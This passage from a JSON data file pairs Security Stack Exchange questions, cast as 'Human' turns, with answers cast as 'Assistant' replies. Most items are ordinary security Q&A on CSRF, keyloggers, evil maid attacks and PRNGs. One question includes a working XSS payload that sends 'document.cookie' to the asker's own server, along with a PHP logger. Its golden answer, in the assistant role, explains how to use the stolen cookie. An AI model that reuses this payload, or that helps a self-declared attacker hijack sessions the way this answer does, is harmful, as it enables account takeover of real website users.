        "golden_answer": " <p>What you are describing is called an <a href=\"https://en.wikipedia.org/wiki/Evil_maid_attack\" rel=\"nofollow noreferrer\">Evil Maid attack</a>.</p>\n\n<p>The short answer is NO: you cannot trust them.</p>\n\n<p>The long answer is MAYBE: depending on the hardware manufacturers of your devices you can verify the integrity of the data and the firmware of their components. However, I still not know any easy solution for all of them as a whole.</p>\n\n<p>For the BIOS and internal HDDs/SSDs you can use a TPM with <a href=\"https://blog.invisiblethings.org/2011/09/07/anti-evil-maid.html\" rel=\"nofollow noreferrer\">Anti Evil Maid</a>, which lets you store a secret inside the TPM and only releases it if the BIOS and storage haven't been tampered with.</p>\n\n<p>For the external storage you can always store checksums on other devices (or even on paper) and verify them later without mounting the drives.</p>\n\n<p>When it comes to the firmware of USB devices, storage devices (internal or external) and mouse, there may be some vendors that allow downloading their firmware or dumping it easily from the device itself. However, in most cases it would have to be extracted from the memory chips and compare it to the previous one to verify its integrity. PS/2 mouses and keyboards present an interesting alternative from this point of view, but they are becoming rare history museum items nowadays.</p>\n\n<p>Many home routers (and all of them should) allow downloading firmware binaries from their manufacturers' websites and flashing them again in recovery mode.</p>\n\n<p>However, as most of the manufacturer's firmware is proprietary, one should ask the following question: can devices be trusted with their original firmware itself?</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p><strong>Quick note:</strong> this is not a duplicate of <a href=\"https://security.stackexchange.com/questions/23371/csrf-protection-with-custom-headers-and-without-validating-token\">CSRF protection with custom headers (and without validating token)</a> despite some overlap.  That post discusses how to perform CSRF protection on Rest endpoints without discussing if it is actually necessary.  Indeed, many CSRF/Rest questions I've read on this site talk about securing the endpoints via CSRF tokens without actually discussing whether or not it is necessary.  Hence this question.</p>\n\n<p><strong>Is CSRF Protection necessary for Rest API endpoints?</strong></p>\n\n<p>I've seen lots of discussion about securing REST endpoints against CSRF attacks, but having given the topic lots of thought, I'm very certain that CSRF tokens on a REST endpoint grant zero additional protection.  As such, enabling CSRF protection on a REST endpoint just introduces some useless code to your application, and I think it should be skipped.  I may be missing something though, hence this question.  I think it will help to keep in mind why CSRF protection is necessary in the first place, and the attack vectors it protects against:</p>\n\n<p><strong>Why CSRF?</strong></p>\n\n<p>It really boils down to the browsers ability to automatically present login credentials for any request by sending along cookies.  If a session id is stored in a cookie the browser will automatically send it along with all requests that go back to the original website.  This means that an attacker doesn't actually have to know authentication details to take an action as the victim user.  Rather, the attacker just has to trick the victims browser into making a request, and the credentials to authenticate the request will ride along for free.</p>\n\n<p><strong>Enter a REST API</strong></p>\n\n<p>Rest API endpoints have a very important difference from other requests: they are specifically stateless, and should never accept/use data from either a cookie or session.  As a result, a REST API that sticks to the standard is automatically immune to such an attack.  Even if a cookie was sent up by the browser, any credentials associated with the cookie would be completely ignored.  Authentication of calls to a REST API are done in a completely different fashion.  The most common solution is to have some sort of authentication key (an OAuth Token or the like) which is sent along in the header somewhere or possibly in the request body itself.</p>\n\n<p>Since authentication is application-specific, and since the browser itself doesn't know what the authentication token is, there is no way for a browser to automatically provide authentication credentials even if it is somehow tricked into visiting the API endpoint.  As a result, a cookie-less REST endpoint is completely immune from CSRF attacks.</p>\n\n<p>Or am I missing something?</p>\n\n\nAssistant:",
        "golden_answer": " <p>I wasn't originally aiming for a self-answer, but after more reading I've come up with what I believe to be a comprehensive answer that also explains why some might still be interested in CSRF protection on REST endpoints.</p>\n\n<p><strong>No cookies = No CSRF</strong></p>\n\n<p>It really is that simple.  Browsers send cookies along with all requests.  CSRF attacks depend upon this behavior.  If you do not use cookies, and don't rely on cookies for authentication, then there is absolutely no room for CSRF attacks, and no reason to put in CSRF protection.  If you have cookies, especially if you use them for authentication, then you need CSRF protection.  If all you want to know is \"Do I need CSRF protection for my API endpoint?\" you can stop right here and leave with your answer.  Otherwise, the devil is in the details.</p>\n\n<p><em>h/t to paj28:</em> While cookies are the primary attack vector for CSRF attacks, you are also vulnerable if you use HTTP/Basic authentication.  More generally, if the browser is able automatically pass along login credentials for your app, then CSRF matters.  In my experience cookies are the most common technology being exploited to make CSRF happen, but there are some other authentication methods that are used which can result in the same vulnerability.</p>\n\n<p><strong>REST = Stateless</strong></p>\n\n<p>If you ask someone \"what is REST\" you will get variety of answers that discuss a variety of different properties.  You can see as much because someone asked that question on stack overflow: <a href=\"https://stackoverflow.com/questions/671118/what-exactly-is-restful-programming\">https://stackoverflow.com/questions/671118/what-exactly-is-restful-programming</a> </p>\n\n<p>One property of REST that I have always relied upon is that it is stateless.  The application itself has state of course.  If you can't store data in a database somewhere, your application is going to be pretty limited.  In this case though, stateless has a very specific and important meaning: REST applications don't track state for the <strong>client-side</strong> application.  If you are using sessions, then you are (almost certainly) keeping track of client-side state, and you are not a REST-full application.  So an application that uses sessions (especially for logins) that are tracked via cookies is not a REST-full application (IMO), and is certainly vulnerable to CSRF attacks, even if it otherwise looks like a REST application.</p>\n\n<p>I think it is worth a quick note that one reason that client-side statelessness is important for REST applications is that the ability of intermediaries to cache responses is also a desirable part of the REST paradigm.  As long as the application is tracking client-side state, caching is not possible.</p>\n\n<p><strong>Rest ≠ Cookieless</strong></p>\n\n<p>For these reasons, I initially assumed that a fully-compliant REST application would never need sessions, never need cookies, and therefore never need CSRF security.  However, there is at least one use-case that may prefer cookies anyway: persistent logins.</p>\n\n<p>Consider a typical client-side (in this case browser, not mobile) web application.  You get started by logging in, which uses a REST API to validate user credentials and in return is given a token to authorize future requests.  For single page applications, you can just keep that token in memory, but doing so will effectively log the user out if they close the page.  As a result, it would be good to persist the state somewhere that can last longer than a single browser session.  Local storage is an option, but is also vulnerable to XSS attacks: a successful XSS attack can result in the attacker grabbing your login tokens and sending them off to the attacker to be used at their discretion.</p>\n\n<p>For this reason, I have seen some suggest using cookies to store login tokens.  With a cookie you can set the http-only flag, which prevents the application from reading the cookie after it is set.  As a result, in the event of an XSS attack, the attacker can still make calls on your behalf, but they can't walk away with the authorization token all together.  This use of cookies doesn't directly violate the statelessness requirement of REST because the server still isn't tracking client-side state.  It is just looking for authentication credentials in a cookie, rather than the header.</p>\n\n<p>I mention this because it is potentially a legitimate reason to use cookies with a REST API, although it is obviously up to a given application to balance the various security and usability concerns.  I would personally try to avoid using cookies with REST APIs, but there may very well be reasons to use them anyway.  Either way, the overall answer is simple: if you are using cookies (or other authentication methods that the browser can do automatically) then you need CSRF protection.  If you aren't using cookies then you don't.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm writing a password manager for Windows which I want to protect against keyloggers. There is a <a href=\"http://msdn.microsoft.com/en-us/library/ms644985.aspx\" rel=\"nofollow noreferrer\">timeout of 5000 ms for keyboard hooks</a>.</p>\n<blockquote>\n<p>The hook procedure should process a message in less time than the data entry specified in the LowLevelHooksTimeout value in the following registry key:</p>\n<p>HKEY_CURRENT_USER\\Control Panel\\Desktop</p>\n<p>The value is in milliseconds.</p>\n</blockquote>\n<p>(The default value of that Registry key is 5000)</p>\n<p>Assuming a password manager running as administrator, could I suspend all programs, simulate typing a key, wait for 5 seconds and then be sure that all keyboard hooks have been disabled by Windows?</p>\n<p>I've not found a way of unregistering all hooks via <a href=\"http://msdn.microsoft.com/en-us/library/windows/desktop/ms644993%28v=vs.85%29.aspx\" rel=\"nofollow noreferrer\">UnhookWindowsHookEx</a> because it requires a handle that I do not have.  This is why I'm resorting to unregistering them by timeout.</p>\n\n\nAssistant:",
        "golden_answer": " <p>There are three reasons I can see why this assumption is dicey.</p>\n\n<ol>\n<li>Hooks are only removed in Windows 7 and above.  This is probably the least of your concern, but worth mentioning.</li>\n<li>The hook is silently removed, and your application has no way of knowing if these actions occurred and/or were successful.</li>\n</ol>\n\n<p>So even if your assumption is correct there is no way for you to know that the hooks were removed.  Which means you should assume that not all of them have been removed.  </p>\n\n<ol start=\"3\">\n<li>This only applies to keyboard hooks that have been registered using <code>SetWindowsHookEx</code></li>\n</ol>\n\n<p>This is the more pressing issue.  A lot of malware are not going to use the built-in hooking API.  They'll write their own hooks which won't be registered with the OS.  Or at an even lower level for key-loggers, they'll be hooking or installing their own system level driver.  Which again, will not be registering with the operating system.  </p>\n\n<p>Suspending all programs is possible, but again you might not be able to suspend the services that the key-logger is installed as or into.  While I think that it's noble of you to try and guard against key-loggers I don't believe it is your responsibility.  </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm creating this admin dashboard, and I have a question wich I have been stuck on for a while now.\nAnd I'm starting to question what kind of data the admin should be able edit/view on the other registered users.</p>\n<p>Should the <strong>admin users</strong> be able to:</p>\n<ul>\n<li>Change the users password?</li>\n<li>Send password-reset email to the user?</li>\n<li>Change account information on the user (firstname, lastname, email)?</li>\n</ul>\n<p>Just to mention this: the users have the possibility to click on <a href=\"http://#\" rel=\"nofollow noreferrer\">forgot password</a> on the login screen to request the password request themselves. They also have the ability to change the account information themselves. Should I still implement some of this functionality on the admin side? Upsides / downsides to this?</p>\n\n\nAssistant:",
        "golden_answer": " <p>It depends on the business context of the application. If these concerns are valid for the business context, perhaps you could split the admin role into two separate roles? Or implement a <a href=\"https://en.wikipedia.org/wiki/Two-man_rule\" rel=\"nofollow noreferrer\">two man rule</a>?</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>How does Avast's https scanning feature work? Is it basically a MITM attack? This feature was enabled in the 2015 version released a few days back</p>\n\n\nAssistant:",
        "golden_answer": " <p>To scan arbitrary HTTPS traffic, you have to do one of the following:</p>\n\n<ol>\n<li><p>You add a hook in the client SSL library so that you get the outgoing data right before it gets encrypted, and the incoming data just after it has been decrypted.</p></li>\n<li><p>You know the server's private key (and the server does not use a \"DHE\" cipher suite).</p></li>\n<li><p>You run a <a href=\"http://en.wikipedia.org/wiki/Man-in-the-middle_attack\">MitM</a>, which implies generating a fake server certificate on-the-fly, by a CA that you control and that has been installed in the \"trusted CA\" store of the client.</p></li>\n</ol>\n\n<p>The second solution is not feasible <em>in general</em> (you can do that when you control the servers, but not for all servers on the Internet). The third solution is what you do in corporations and big organizations where maintaining client-side SSL hooks is cumbersome and a huge logistics problem, while doing a one-time insert of an extra root CA is easy.</p>\n\n<p>A locally installed antivirus has the choice. The \"hook\" option is cleaner, but is specific to a given SSL library; typically, IE and Firefox do not use the same SSL implementation at all, so if Avast uses the hook method then it must hook into both implementations. The MitM method is easier to apply system-wide, and is more resilient to software updates, but it can break some functionalities (e.g. client certificates). To know which method was applied, try to connect to various HTTPS sites, and have a look at their certificate chain; if all the chains go back to a single CA that looks Avastish, then that's the MitM method. If the chains go back to various existing root CA, then that's the hook method.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have taken advantage of an XSS vulnerability to steal a cookie by sending it as a variable in the URL to my php page. I think that is one of the normal processes.</p>\n\n<p>This is the XSS payload:</p>\n\n<pre><code>&lt;script&gt;location.href = 'http://myserverIP/test/signup.php?cookie='+document.cookie;&lt;/script&gt;\n</code></pre>\n\n<p>And this is my php:</p>\n\n<pre><code>$cookie = $_GET['cookie'];\n\n//open the file and choose the mode\n$fh = fopen(\"users\", \"a\");\nfwrite($fh, $cookie);\n\n//close the file\nfclose($fh);\n\nprint \"User Submitted: \";\nprint ($cookie);\n</code></pre>\n\n<p>Everything well so far. But now that I have the cookie, how do I use it to get into the website I stole it from?</p>\n\n\nAssistant:",
        "golden_answer": " <p>AFAIK, using stolen cookies depends on the browser you are using.<br/>\nFor instance firefox stores cookies in a not-plain-text file <strong>cookies.sqlite</strong> in which you can't just copy/past the cookie's key/value.<br/>\nFirebug gives you the ability to add/edit cookies for the targeted website.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am starting to become wary of giving out my email account to anyone, just by doing reconnaissance it is evident how easy it is to pull so much information from a person just by a email,</p>\n\n<p>There is a privacy concern (IMO), as email accounts are associated with social networks, blogs and any other online accounts. </p>\n\n<p>How can I increase my privacy and security when using email accounts? Should I use several hushmail account and forward all emails to my main account (which remains completely private)?</p>\n\n\nAssistant:",
        "golden_answer": " <p>As you point out, there are several \"classes\" of email addresses that sites require, such as:</p>\n\n<ol>\n<li>One-time, or limited-time use where the email address is only used to access the information, but no email is actually sent.</li>\n<li>Sites where email is actually sent containing information, but this information is not considered sensitive (eg. social networking)</li>\n<li>Sensitive sites (online banking, etc.)</li>\n</ol>\n\n<p>There are as many types of systems in the spectrum that you can think of.  My personal system uses these three categories.  You may also want to separate \"sensitive\" sites from actual correspondence with family and friends since breaches on their accounts can percolate to your own.  Sensitivity of certain information may warrant their own email accounts.</p>\n\n<p>One-time and limited-use sites use the email address as a login name only.  Therefore use services such as 10minutemail.com to generate email addresses for their use.  As long as you remember the email address name (or allow your browser to remember it), then you will not need the actual contents of the email account.  Or generate a new account each time you need to access information.</p>\n\n<p>Sites which will actually notify you -- and you want to be notified of events -- require an account that you can dedicate to that course.  Create another account which you need not worry about. Make use of additional features, if they exist, such as gmail's \"+\" modifier to help streamline the process as required.</p>\n\n<p>Sensitive sites are the email addresses you can carefully protect against giving out.</p>\n\n<p>Placing these across several systems can help protect against a full breach.</p>\n\n<p>Creating usernames which are uncommon or \"random\" can help prevent spammers with malicious intent from getting email to you by broadcast attempts.  That is spammers may send emails to well-known first names, or well-known firstname/lastname combos) at domains to see if anything gets through (bob@example.com or smith.jones@example.com).  As with any security solution, obscurity is not security, but it can provide a veil of darkness that the average malicious user will have trouble penetrating.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm decrypting some data using Java and Apache's most recent WSS4J library with 128-bit AES decryption.</p>\n\n<p>I setup the the cipher which appears to be correct with the right padding, decryption algorithm, and cipher block mode.</p>\n\n<p>I then make a call to doFinal() on the encrypted data bytes and it successfully returns a value.</p>\n\n<p>My question is would it ever return a value that is only partially decrypted?</p>\n\n<p>For example, let's say the first 16 bytes are still jumbled up after decryption, but the remainder of the data returned has been successfully decrypted, and is human-readable with the expected data there. </p>\n\n<p>Would this mean that there could be an issue with my decryption process? Or would it not even be able to return a value from the doFinal() step if something was even slightly off with the decryption setup?</p>\n\n<p>If I get a value returned from doFinal() would that mean that 100% the data returned is the original data before it was encrypted?</p>\n\n<p>I'm decrypting data from a web service call and the owners of the web service are claiming that I must be doing something wrong during my decryption process and that they are sending the data correctly.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Depending on the block mode you are using, you can get partially decrypted data. For example, in CBC mode, if an incorrect IV is supplied, the first block of data will not decrypt properly. However, the rest of the data will decrypt successfully (assuming you are using the correct encryption key). This is because the IV of block (x + 1) is the ciphertext of block x.</p>\n\n<p>Wikipedia's diagram is pretty helpful in visualizing this.</p>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_.28CBC.29\" rel=\"noreferrer\">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_.28CBC.29</a></p>\n\n<p><a href=\"https://i.stack.imgur.com/tMxaG.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/tMxaG.png\" alt=\"enter image description here\"></a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Suppose your university has a centralized ldap server used to authenticate all students, teachers and staff for all services provided by the university (email, exams, taxes...) Suppose that in the computer lab it is possible for every authenticated user to issue an ldapsearch and get all the data of all people in the university: students, teachers, technicians... Suppose the data contains also the fields: sambaLMPassword and sambaNTPassword with the encrypted password of each person.</p>\n\n<p>Now suppose you are a little worried (you are a teacher and think that maybe the students could crack the system and stole passwords) so you speak with the technical staff of the university and they say something along the following lines:</p>\n\n<ul>\n<li>we know this since a long time, but the password hashes are needed by some old service we need to keep;</li>\n<li>anyway the passwords are encrypted and it is illegal to brute force them;</li>\n<li>and our students are not so smart to understand that they can obtain and decrypt them;</li>\n<li>however, please, keep this secret.</li>\n</ul>\n\n<p>Would you be reassured by the answers? What would you do next?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Educational institutions are often required to obtain and maintain compliance and certification in <a href=\"https://www.ekransystem.com/en/blog/cybersecurity-in-educational-institutions\" rel=\"nofollow noreferrer\">numerous cybersecurity standards</a>.  Maintaining a weak cipher suite or broken encryption may put them out of compliance, which could be uncovered on their next audit.</p>\n\n<p>When I see \"NT password\" I get very worried-- <a href=\"https://www.cnet.com/news/cracking-windows-passwords-in-seconds/\" rel=\"nofollow noreferrer\">Windows passwords can be cracked in about 13.6 seconds</a>.  A <code>sambaNTPassword</code> is <a href=\"https://serverfault.com/questions/24543/what-is-the-difference-between-sambalmpassword-and-sambantpassword\">just an MD4 hash</a>, which is a hashing algorithm that is <a href=\"https://en.wikipedia.org/wiki/MD4\" rel=\"nofollow noreferrer\">horribly broken</a> and has been for well over a decade.</p>\n\n<p>That being said, these systems should be under occasional audit and will eventually get caught and addressed if possible (or a waiver and other mitigations will need to be put in place, e.g. a second factor of authentication that protects administrator accounts). So if you choose not to do anything, it doesn't mean they won't fix it...eventually.</p>\n\n<p>If they are purposefully concealing this vulnerability during compliance audits,  this is not technically illegal, but they can lose their various certifications if they get caught, and open themselves up for civil liability if they get hacked.</p>\n\n<p>As for this comment</p>\n\n<blockquote>\n  <p>and our students are not so smart to understand that they can obtain and decrypt them</p>\n</blockquote>\n\n<p>^ Is a ridiculous statement from someone who is forgetting that the younger generation bypasses their elders by several orders of magnitude when it comes to things like this.  <a href=\"https://en.wikipedia.org/wiki/Kristoffer_von_Hassel\" rel=\"nofollow noreferrer\">This guy</a> found vulnerabilities in the XBox at <strong>age five</strong>!!!!  (He now works for Microsoft security)</p>\n\n<blockquote>\n  <p>however, please, keep this secret.</p>\n</blockquote>\n\n<p>I would not agree to that, but be polite about it.  You should be clear that you are not willing to lie to cover someone else's mistakes. </p>\n\n<blockquote>\n  <p>What would you do next?</p>\n</blockquote>\n\n<p>Personally, I would treat this as a \"teachable moment\" (remember that you are still a student) and express that you would like to learn more.  See if you can arrange a meeting with one of the university's cybersecurity compliance officers-- these are the folks that sign the forms that swear and affirm that they are maintaining compliance, and who regularly work with auditors.  Once you bring it to his or her attention, you can safely say you did everything you could do, and it will be their job to take it from there.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have been lately browsing material icons from <a href=\"https://thenounproject.com/creativestall/collection/love-and-romance-material-icons/?i=505415\" rel=\"nofollow noreferrer\">this site</a>.</p>\n\n<p>I started to notice that they don't have any free plans as such so you will have to buy the icons if you want to download them. But however I am concerned regarding the preview. I just had to inspect element in the browser and found out that there was a dynamically added style to a div element with the following background-image property:</p>\n\n<pre><code>https://d30y9cdsu7xlg0.cloudfront.net/noun-svg/505415.svg?Expires=1492526661&amp;Signature=EctcroYLIkJ1lZhiuXcA2uxrKW2zsC3ycNlPajZuLJw62r9ADMRJkpm8chNYDc0hssTXASy2FdYUL~A9vd8bXE2Sil-Xp2A19WZjcI6nurxp3MUrEgzvhC4ssUmT6~CmHs8UwmMX1MVkYM~TydUOaTuzOnCOqaMTRp~9wBE5iGQ_&amp;Key-Pair-Id=APKAI5ZVHAXN65CHVU2Q\n</code></pre>\n\n<p>Wow! I got the URL that leads me to the SVG icon! Then Save as > Download > icon.svg.</p>\n\n<p>The above link might be updated later on as you can see parameters like <code>Expires</code>, <code>Signature, 1</code>, <code>pair-Id</code> and stuff. So you will have to go inspect yourself.</p>\n\n<p>Since this can't be called a vulnerability, I am a bit hesitant to ask how such sites can  display a preview without enabling frauds to steal their content.</p>\n\n<p>There should be some way right? Is it impossible?</p>\n\n\nAssistant:",
        "golden_answer": " <p>In my opinion, there can be two options. The first would be to add watermarks. The watermarks can be added dynamically(only the fly). There are various tools, that can add watermarks to an image before rendering it. \nThe Second option wont prevent anyone from stealing it, but can help you to claim your image at any later point by checking its signature. The signature can be put into the image by adding some hexadecimal random codes into the image file. Of course, the code wont change the image view/format and it shall not be visible to the naked eye.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm concerned that in my network some background applications / virus can use my internet connection as malicious backdoor, and then I'm in trouble (i.e. authorities can think that one of my pc has done something illegitimate / illegal) so I've taken the decision to CLOSE all the outgoing connection to the network, except navigation and some other services (skype, email, ecc); but how can I perform this being secure that a virus / backdoor will utilize the ports opened to obtain the above services (ie 80, 483, 25, 143, 587 ecc.)? Should this be made at application level (what for example if a virus simulate to be \"outlook.exe\" and send an email to the regular port I opened?) What's the best policy for this environment? I would like to setup it in my firewall, and leaving EVERYTHING but the web and other services out. It seems to be a problem bigger than I can handle. Thank you.</p>\n\n\nAssistant:",
        "golden_answer": " <p>What you want to achieve is impossible using a simple firewall that just blocks ports, exactly for the reasons you stated. A smart malicious program installed on your machine will use ports you don't block, e.g. 80, 443 or maybe the various ports used for smtp, although these aren't as reliable as 80 and 443. It might also use udp and masquerade  as DNS lookups.</p>\n\n<p>To catch such traffic, you'd need a firewall that inspects traffic (deep packet inspection). Or you could use an intrusion detection system; these often work by learning what constitutes \"normal\" traffic and then alerting you when traffic that gows outside these bounds is detected. This might be as simple as alerting you when a lot of connections to different machines are opened, or detect moee complicated patterns.</p>\n\n<p>If you're a private person trying to secure a home network, I'd say the effort isn't worth the gains. It's different for a company network.</p>\n\n<p>Blocking destination ports you don't need on outgoing traffic is a good first step, though, and doesn't have negative consequences. You can also block specific host names or IP adresses to block specific programs from phoning home.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have a question in my exam last week on Network Security whether a malware can be transferred over a VPN tunnel?</p>\n\n<p>My answer was YES, since VPN only provide encryption, and makes sure data travel from point A to point B encrypted. </p>\n\n<p>What I understand is, a generic VPN will encrypt any kind of data, even if its a virus or a malware, and transfer it securely over a network. </p>\n\n<p>Once data is encrypted, even VPN cannot scan it or perform any checking on that data unless it is reached to point B where it is decrypted.</p>\n\n<p>I am still confused if I was correct.</p>\n\n\nAssistant:",
        "golden_answer": " <p>While it is possible that some product exists that attempts to do virus detection, a VPN alone does not provide any assurances regarding the content that flows through it. You are right that the VPN may be encrypted (a VPN doesn't need encryption to be a VPN, as its main use is to tunnel in to remote networks, although nearly all VPNs are encrypted), and thus network IDS systems will typically not be able to analyze the contents. That said, sensors could be placed on the VPN server to inspect traffic after encryption terminates.</p>\n\n<p>So yes, it is certainly possible for malware to travel/spread over a VPN. It's just data like anything else.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Like a lot of people I have a simple consumer grade router at home. The setup is pretty standard: </p>\n\n<blockquote>\n  <p>Ethernet from the cable modem --> router's WAN </p>\n</blockquote>\n\n<p>Given the poor track record of consumer routers in terms of security I decided it would be safer to put the router behind a firewall. In my case I used a spare PC and setup a dedicated pfSense box. The new config is:</p>\n\n<blockquote>\n  <p>Ethernet from cable modem --> pfSense --> router connected to pfSense LAN.</p>\n  \n  <p>(Router  gets IP via DHCP from pfSense LAN)</p>\n</blockquote>\n\n<p>My thinking is that pfSense is more actively updated then my router's firmware so it should have less bugs and vulnerabilities. It also offers more control than my router.</p>\n\n<p>My question is, assuming a properly configured pfSense, <strong>does the addition of pfSense add any additional security from outside attacks?</strong> I understand that the firewall does nothing to mitigate \"user error\" attacks like downloading malware, plugging in infected USB drive, etc.</p>\n\n<p>Thanks.</p>\n\n\nAssistant:",
        "golden_answer": " <p>After reading a bit into the documentation this seems like a nice bit of additional security for a home network. You have a basic firewall package with basic networking features. In your case it is free, and can be a nice side project. Some things you will want to configure:</p>\n\n<p><strong>Firewall rules</strong></p>\n\n<p>Make sure you actually configure firewall rules to fit your situation. <a href=\"https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=firewall%20best%20practices%20guide\" rel=\"nofollow\">There are plenty of guides</a>, take your pick. </p>\n\n<p><strong>NetFlow</strong></p>\n\n<p>I notice that <a href=\"http://www.ex-parrot.com/pdw/iftop/\" rel=\"nofollow\">iftop</a> and <a href=\"http://bandwidthd.sourceforge.net/\" rel=\"nofollow\">bandwithd</a> are both <a href=\"https://doc.pfsense.org/index.php/Features_List\" rel=\"nofollow\">available packages</a> to install. I would recommend these. If you notice you're home network is sending out tons of data at 3 am, there may be a problem. These tools can help you identify those issues. </p>\n\n<p><strong>IPS/IDS</strong></p>\n\n<p><a href=\"https://www.snort.org/\" rel=\"nofollow\">Snort</a> and <a href=\"http://suricata-ids.org/\" rel=\"nofollow\">Suricata</a> are also both available packages. I'd recommend picking one and installing a simple interface to view alerts (<a href=\"https://github.com/snorby/snorby\" rel=\"nofollow\">snorby</a> is simple, and nice). </p>\n\n<p>If you have the time, and inclination these steps will be good first steps towards securing your home network. Have fun. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Here’s a quote <a href=\"http://www.reddit.com/r/programming/comments/1xh2t8/when_random_isnt_random_enough_lessons_from_an/cfbllv9\" rel=\"noreferrer\">from a reddit discussion</a>:</p>\n<blockquote>\n<p>… for poker [a cryptographically secure RNG] is completely unnecessary.\nIf you have an appropriate unpredictable seed, and you are throwing away a lot of the randomness, MT is perfectly safe.</p>\n</blockquote>\n<p>I’d normally write this off as ignorance, but this goes on:</p>\n<blockquote>\n<p>I've actually implemented a real-money poker backend, and the company even had it certified</p>\n</blockquote>\n<p>And since <a href=\"http://knowyourmeme.com/memes/just-go-on-the-internet-and-tell-lies\" rel=\"noreferrer\">nobody lies on the internet</a>, this makes me wonder. Said person expands on this <a href=\"http://www.reddit.com/r/programming/comments/1xh2t8/when_random_isnt_random_enough_lessons_from_an/cfblqlr\" rel=\"noreferrer\">in another part of the discussion</a>:</p>\n<blockquote>\n<p>[To prevent predictability] you would not use 624 consecutive values produced from [the MT generator]. If you want a real-money app. certified, one of the criteria is to throw away a large and unpredictable amount of the output of the PRNG.</p>\n<p>You also don't know the specifics of how the PRNG was used to produce a shuffle. So, you have no way to map the cards you see on the table to a sequence from the PRNG.</p>\n<p>You also don't know when the PRNG is reseeded.</p>\n<p>One last thing. You need to store (2<sup>19937</sup> − 1) * 4 bytes of data for lookup, in order to find the pattern you need to predict.</p>\n</blockquote>\n<p>Except for the last paragraph, these arguments sounds suspiciously like security by obscurity. The last paragraph sounds less so, but somebody else in the discussion has claimed that the statement is untrue, and you don’t need such a big lookup table.</p>\n<p>Just to clarify, I’m aware that MT19937 isn’t cryptographically secure (and so is the person I’m quoting). However, my assumption so far was that gambling (and poker) would require a cryptographically secure random source – and not just a secure seed – (a) to be tamper proof, and (b) for certification. Is this wrong?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Here is the cryptographer's point of view. The person you quote <em>says</em>: \"you don't need a cryptographically secure PRNG\", but what he actually <em>claims</em> is \"when I use MT 19937 and do some mumbo-jumbo such as throwing away a large part of the output, it somehow becomes a cryptographically secure PRNG\".</p>\n\n<p>His comment about storing \"(2<sup>19337</sup>-1)*4 bytes for lookup\" is enough to demonstrate that he is not very clear in his head about what security, cryptography, randomness and unpredictability actually are. This figure is the \"period\"; the period was used in (very) older times as a measure of security, because known PRNG from that time had very small periods, to the point that repetition did occur in practice. This engendered a whole family of non-crypto PRNG where designers where trying to overawe their competitors by flourishing the longest possible period. This makes no real sense from a cryptographic point of view. Security of a PRNG is about <em>unpredictability</em>, and a very short period is an issue only because it allows future output to be predictable. AES used in CTR mode is a PRNG with a period of 2<sup>135</sup> (bits), a figure much lower than 2<sup>19337</sup>-1, and yet not a problem at all.</p>\n\n<p>The \"throwing away of large and <em>unpredictable</em> amount of output\" also illustrates the confusion. Removing bits from the output <em>may</em> hide some state leakage from a weak PRNG; this can even turn a weak PRNG into a strong one, as studied with the <a href=\"http://en.wikipedia.org/wiki/Shrinking_generator\">shrinking generator</a>. However, it does nothing about seed predictability; indeed, if some of the output is \"thrown away\", then there is a mechanism which decides what to keep and what to throw away, and that mechanism is also part of the PRNG. If all of this is seed with the current time, then exhaustive search on the possible \"current time\" values <em>will</em> be efficient (current time is not a secret) and <em>will</em> unravel the whole thing.</p>\n\n<hr />\n\n<p>However we may argue that though MT is not cryptographically secure, this does not mean that making an effective attack is <em>easy</em>. There are three types of PRNG:</p>\n\n<ul>\n<li>The awfully weak algorithms, either through very poor processing (leaking the internal state), or predictable seed, or both. These are broken in practice.</li>\n<li>The \"cryptographically strong\" PRNG, which resist attacks even in the ludicrous conditions that academics assume (an academic will consider an algorithm as \"broken\" if it claims 128-bit security but offers only 2<sup>123.4</sup> resistance).</li>\n<li>The <em>grey zone</em> in between: broken as per academics, but a practical attack is not immediate.</li>\n</ul>\n\n<p>With his <a href=\"http://en.wikipedia.org/wiki/Mersenne_twister\">Mersenne Twister</a>, he is in the grey zone, and he believes that his voodoo manipulations will keep it that way. It is entirely plausible that he could also convince an auditor that voodoo works. This in no way implies that the algorithm is <em>secure</em>; only that an auditor was ready to sign a paper claiming that the algorithm fulfils some legal requirements. At that point, it is a good thing to remember that some other auditors found it fit to sign papers claiming that <a href=\"http://www.cbc.ca/news/business/the-rise-and-fall-of-enron-a-brief-history-1.591559\">Enron</a> was a financially sound and clean venture: this helps to put things into the right perspective.</p>\n\n<p>From what he describes, chances are that the initial seed is time-based, and the <em>actual</em> security relies entirely on the non-publication of the algorithm details. That's security through obscurity at its best (or worst, depending from the point of view).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have seen a variety of banks allowing access to their remote banking environment with just your fingerprint (via iphones and similar devices). Are these valid examples of a wider group of cases where pure biometric authentication is acceptable, or is this just a failure of the banks in question?</p>\n\n\nAssistant:",
